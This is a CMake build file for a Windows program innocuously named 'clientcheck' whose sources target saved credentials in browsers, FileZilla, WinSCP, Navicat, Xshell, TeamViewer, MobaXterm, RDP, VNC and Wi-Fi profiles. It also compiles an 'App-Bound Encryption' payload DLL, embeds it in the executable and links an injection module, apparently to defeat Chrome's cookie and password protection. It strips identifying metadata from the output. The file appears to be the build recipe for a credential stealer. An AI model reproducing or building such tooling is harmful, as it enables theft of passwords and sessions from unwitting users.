cmake_minimum_required(VERSION 3.15)
project(clientcheck C)

set(CMAKE_C_STANDARD 11)
set(CMAKE_C_STANDARD_REQUIRED ON)

# Use gcc-ar for proper LTO support (plain ar can't handle LTO objects)
if(NOT MSVC)
    set(CMAKE_AR "${CMAKE_C_COMPILER_AR}")
    set(CMAKE_RANLIB "${CMAKE_C_COMPILER_RANLIB}")
endif()

# Collect all source files
set(SOURCES
    src/main.c
    src/help.c
    src/tinycrypto.c
    src/browser/utils.c
    src/browser/sqlite.c
    src/browser/crypto.c
    src/browser/chromium.c
    src/browser/firefox.c
    src/browser/ie.c
    src/dbeaver.c
    src/filezilla.c
    src/finalshell.c
    src/navicat.c
    src/rdp.c
    src/remotecontrol.c
    src/search.c
    src/vnc.c
    src/winscp.c
    src/xshell.c
    src/tortoisesvn.c
    src/teamviewer.c
    src/mobaxterm.c
    src/wifi.c
    external/sqlite3.c
)

# ---- ABE (App-Bound Encryption) payload: build DLL and embed into the exe ----
set(ABE_NATIVE_DIR ${CMAKE_SOURCE_DIR}/src/abe/abe_native)
set(ABE_PAYLOAD_BIN ${CMAKE_BINARY_DIR}/abe_extractor_amd64.bin)
set(ABE_PAYLOAD_OBJ ${CMAKE_BINARY_DIR}/abe_payload.o)
set(ABE_NATIVE_SRCS
    ${ABE_NATIVE_DIR}/abe_extractor.c
    ${ABE_NATIVE_DIR}/com_iid.c
    ${ABE_NATIVE_DIR}/bootstrap.c)

if(NOT MSVC)
    add_custom_command(
        OUTPUT ${ABE_PAYLOAD_BIN}
        COMMAND ${CMAKE_C_COMPILER} -shared -s -O2
                -fno-stack-protector -fno-builtin
                -I${ABE_NATIVE_DIR}
                -Wl,--subsystem,windows
                ${ABE_NATIVE_SRCS} -o ${ABE_PAYLOAD_BIN}
                -lole32 -loleaut32 -lcrypt32
        DEPENDS ${ABE_NATIVE_SRCS}
                ${ABE_NATIVE_DIR}/com_iid.h
                ${ABE_NATIVE_DIR}/bootstrap.h
                ${ABE_NATIVE_DIR}/bootstrap_layout.h
        COMMENT "Building ABE payload DLL (abe_extractor_amd64.bin)"
        VERBATIM)
    add_custom_command(
        OUTPUT ${ABE_PAYLOAD_OBJ}
        COMMAND ${CMAKE_LINKER} -r -b binary -o abe_payload.o abe_extractor_amd64.bin
        DEPENDS ${ABE_PAYLOAD_BIN}
        WORKING_DIRECTORY ${CMAKE_BINARY_DIR}
        COMMENT "Embedding ABE payload into linkable object"
        VERBATIM)
    set_source_files_properties(${ABE_PAYLOAD_OBJ} PROPERTIES EXTERNAL_OBJECT TRUE GENERATED TRUE)
    list(APPEND SOURCES src/abe/abe_inject.c ${ABE_PAYLOAD_OBJ})
    add_compile_definitions(ABE_PAYLOAD_EMBEDDED)
endif()

# Create executable
add_executable(clientcheck ${SOURCES})

# Include directories
target_include_directories(clientcheck PRIVATE
    ${CMAKE_SOURCE_DIR}/src
    ${CMAKE_SOURCE_DIR}/external
)

# Link libraries — no OpenSSL needed! Only Windows system libs
target_link_libraries(clientcheck
    crypt32 advapi32 userenv shell32 wtsapi32 user32
)

# Compiler definitions
target_compile_definitions(clientcheck PRIVATE
    _CRT_SECURE_NO_WARNINGS
    _WINSOCK_DEPRECATED_NO_WARNINGS
    # SQLite minimal build — we only need read-only SELECT queries
    SQLITE_OMIT_DEPRECATED
    SQLITE_OMIT_LOAD_EXTENSION
    SQLITE_OMIT_SHARED_CACHE
    SQLITE_OMIT_COMPILEOPTION_DIAGS
    SQLITE_OMIT_COMPLETE
    SQLITE_OMIT_TRACE
    SQLITE_OMIT_UTF16
    SQLITE_DQS=0
    SQLITE_THREADSAFE=0
    SQLITE_DEFAULT_MEMSTATUS=0
    SQLITE_MAX_ATTACHED=0
    SQLITE_MAX_EXPR_DEPTH=0
)

# Size optimization flags
if(MSVC)
    target_compile_options(clientcheck PRIVATE /O1 /MT /GL /Gy)
    target_link_options(clientcheck PRIVATE /OPT:REF /OPT:ICF /LTCG)
else()
    target_compile_options(clientcheck PRIVATE -Os -flto -fno-ident -fno-asynchronous-unwind-tables -ffunction-sections -fdata-sections)
    target_link_options(clientcheck PRIVATE -flto -Wl,--gc-sections -Wl,--strip-all -Wl,--build-id=none -Wl,--no-insert-timestamp -s)
endif()
